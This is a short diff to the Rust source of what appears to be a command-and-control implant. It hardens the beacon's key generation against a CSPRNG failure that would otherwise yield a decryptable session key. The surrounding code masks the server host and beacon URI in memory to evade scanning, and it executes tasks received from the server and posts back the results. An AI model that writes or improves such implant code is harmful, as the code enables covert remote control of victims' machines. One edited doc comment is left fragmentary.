@@ -39,7 +39,15 @@ pub unsafe fn beacon_loop() {
     // sees ciphertext, not cleartext server_host/beacon_uri strings.
     crate::mem::register_owned(config_plain);
 
-    let kp = ImplantKeypair::generate();
+    let kp = match ImplantKeypair::generate() {
+        Ok(k) => k,
+        Err(_) => {
+            // CSPRNG failure is fatal — proceeding would build a zero scalar →
+            // identity-point ECDH → a deterministic, decryptable session key.
+            crate::entry::diag_mark(b"ERR_KEYGEN_CSPRNG");
+            return;
+        }
+    };
     let key = kp.session_key(&cfg.server_pub);
     // Register the session key (ECDH-derived, 32 bytes) as a maskable region.
     crate::mem::register_key(*key.as_bytes());
@@ -176,7 +184,6 @@ pub unsafe fn beacon_loop() {
 ///
 /// Exit codes:
 ///   1 = check-in succeeded (SessionInfo accepted by the server)
-///   2 = check-in succeeded AND at least one task was received + executed +
 ///       its response POSTed back (full round-trip)
 ///   0xC0..0xCF = a specific step failed (see inline comments)
 pub unsafe fn beacon_oneshot() -> u32 {
@@ -184,7 +191,13 @@ pub unsafe fn beacon_oneshot() -> u32 {
     crate::mem::register_owned(config_plain);
     // DIAG step 1: config loaded OK
 
-    let kp = ImplantKeypair::generate();
+    let kp = match ImplantKeypair::generate() {
+        Ok(k) => k,
+        Err(_) => {
+            crate::entry::diag_mark(b"ERR_ONESHOT_CSPRNG");
+            return 0xAF; // CSPRNG failure exit code
+        }
+    };
     // DIAG step 2: keygen done (if we crash here → CSPRNG or curve25519)
     let key = kp.session_key(&cfg.server_pub);
     // DIAG step 3: session_key (HKDF) done
